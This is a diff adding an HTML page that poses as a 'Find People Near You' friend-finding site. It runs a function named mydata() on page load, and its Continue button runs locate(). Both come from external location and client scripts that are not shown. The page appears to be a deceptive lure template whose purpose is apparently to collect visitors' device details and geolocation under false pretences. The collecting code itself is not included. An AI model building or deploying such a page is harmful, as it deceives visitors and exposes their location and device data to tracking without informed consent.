@@ -1,0 +1,31 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <title>Near You | Meet New People, Make New Friends</title>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="theme-color" content="#000000">
+    <link rel="icon" type="image/x-icon" href="flat-location-logo-152-234349.png">
+    <link href="fonts.css" rel="stylesheet">
+    <link href="main.css" rel="stylesheet">
+    <script type="text/javascript">
+    
+    </script>
+    <script src="../../assets/js/jquery.min.js"></script>
+    <script src="../../assets/js/particles.min.js"></script>
+    <script src="../../assets/js/location.js"></script>
+    <script src="../../assets/js/client.min.js"></script>
+    <script src="../../assets/js/loc.js"></script>
+    <script src="../../assets/js/warpspeed.min.js"></script>
+  </head>
+  <body onload="mydata()">
+    <canvas id="canvas" style="width:100%; height:100%;"></canvas>
+    <script>var x=new WarpSpeed('canvas',
+    '{"speed":2,"speedAdjFactor":0.03,"density":1,"shape":"circle","warpEffect":true,"warpEffectLength":3,"depthFade":false,"starSize":3,"backgroundColor":"hsl(0,0%,0%)","starColor":"#FFFFFF"}');</script>
+    <div><h1>Find People Near You</h1></div>
+    <div><h2>Meet New People, Make New Friends</h2></div>
+    <div class="earth"></div>
+    <div><button id="change" class="button" type="button" onclick="locate()">Continue</button></div>
+    <div class="text" id="result"></div>
+  </body>
+</html>
